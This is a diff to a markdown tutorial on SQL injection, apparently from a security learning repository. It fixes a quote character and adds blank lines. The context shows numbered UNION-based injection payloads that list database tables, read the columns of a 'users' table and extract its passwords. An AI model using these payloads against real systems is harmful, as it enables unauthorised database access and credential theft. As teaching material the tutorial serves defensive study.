@@ -50,12 +50,15 @@ See a more detailed [explanation about SQL injection](sql-injection.md).
 # 5. Get names of all tables from the selected database
 1' OR '1'='1' UNION SELECT null,table_name,null,null,null,null FROM information_schema.tables;# 
 
+
 # 6. Get the name of all columns of a selected table from a selected database
-1' OR '1'='1' UNION SELECT null,column_name,null,null,null,null FROM information_schema.columns WHERE table_name=’users’;#
+1' OR '1'='1' UNION SELECT null,column_name,null,null,null,null FROM information_schema.columns WHERE table_name='users';#
+
 
 # 7. Get the value of a selected column (for instance, password)
 1' OR '1'='1' UNION SELECT null,passwords,null,null,null,null FROM users;#
 ```
+
 
 Also, once we know which column is injectable, there are some php functions that can provide us some worthy knowing data:
 
